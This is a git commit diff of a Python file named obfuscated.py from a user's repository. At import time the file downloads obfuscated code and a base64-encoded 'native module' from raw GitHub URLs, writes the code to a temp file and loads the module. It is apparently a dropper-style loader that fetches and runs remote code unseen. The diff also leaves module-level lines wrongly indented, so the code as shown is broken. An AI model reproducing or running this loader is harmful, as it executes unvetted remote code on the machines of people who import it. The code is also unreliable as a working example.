f5c0c872138f73f718ef8dc8b5097002dd61cc7d
Markest-sys <markestreal@gmail.com>
2025-03-03 00:09:25 +0300

    Add files via upload

--- obfuscated.py
+++ obfuscated.py
@@ -14,7 +14,7 @@ def load_base64_content():
     response.raise_for_status()
     return response.text
 
-obfuscated_pyURL = "https://raw.githubusercontent.com/Markest-sys/raw/refs/heads/main/base64.txt"
+obfuscated_pyURL = "https://raw.githubusercontent.com/Markest-sys/raw/refs/heads/main/obfuscated.py"
 
 def load_obfuscated_content():
     url = obfuscated_pyURL
@@ -22,18 +22,19 @@ def load_obfuscated_content():
     response.raise_for_status()
     return response.text
 
+
+
 temp_code = load_obfuscated_content()
 
-# Создание временного файла при запуске
-import tempfile
-import os
+    # Создание временного файла при запуске
+    import tempfile
+    import os
 
-temp_dir = tempfile.gettempdir()
-temp_file = os.path.join(temp_dir, 'obfuscated.tmp')
-with open(temp_file, 'w', encoding='utf-8') as f:
-    f.write(temp_code)
-
-native_module_base64 = load_base64_content()
+    temp_dir = tempfile.gettempdir()
+    temp_file = os.path.join(temp_dir, 'obfuscated.tmp')
+    with open(temp_file, 'w', encoding='utf-8') as f:
+        f.write(temp_code)
+    native_module_base64 = load_base64_content()
 
 
 def load_native_module():
@@ -49,5 +50,3 @@ def load_native_module():
     return module
 
 native_module = load_native_module()
-
-
